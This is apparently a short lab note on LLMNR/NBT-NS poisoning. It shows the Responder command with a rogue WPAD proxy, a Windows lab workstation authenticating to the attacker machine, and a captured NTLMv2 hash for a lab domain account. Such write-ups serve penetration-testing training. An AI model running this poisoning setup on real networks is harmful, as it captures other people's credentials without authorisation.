Resources:
https://www.thehacker.recipes/a-d/movement/mitm-and-coerced-authentications/llmnr-nbtns-mdns-spoofing

---
On the attacker machine run responder:
```bash
sudo responder -v -I eth0 -dwP
```
Args:
`-v`: Verbose
`-I`: Interface to listen on
`-d`: Respond to DHCP broadcast reqeusts
`-w`: Starts a WPAD (Web Proxy Autodiscovery Protocol) rogue proxy server
`-P`: Force NTLM authentication for the proxy

>[!Note]
>In responder version 3.1.4.0 you can't use *-w* and *-P* at the same time. Thus, only us *-w* to startup the rogue wpad server.


Start the windows workstation THEPUNISHER.
Open explorer and type in the IP address of the kali machine:
![[Pasted image 20240312130628.png]]

In the responder output we can see that we were able to capture a NTLMv2 hash:
![[Pasted image 20240312130730.png]]
Captured NTLMv2 hash:
```NTLMv2 hash
frank::MARVEL:2f1894eef0b9f0f0:CE7DD0013EE2217C86D5A35A3CDA16AC:010100000000000000F6235E7D74DA01C6BD2A8295D355520000000002000800510054004500520001001E00570049004E002D00350030004B004900440035005A005A004A0034005A0004003400570049004E002D00350030004B004900440035005A005A004A0034005A002E0051005400450052002E004C004F00430041004C000300140051005400450052002E004C004F00430041004C000500140051005400450052002E004C004F00430041004C000700080000F6235E7D74DA010600040002000000080030003000000000000000010000000020000015CD9F2B93D73467622A1036EDA865C87C96953D16AFC2803E87721D673D00BA0A0010000000000000000000000000000000000009001C0063006900660073002F00310030002E0030002E0030002E00310031000000000000000000
```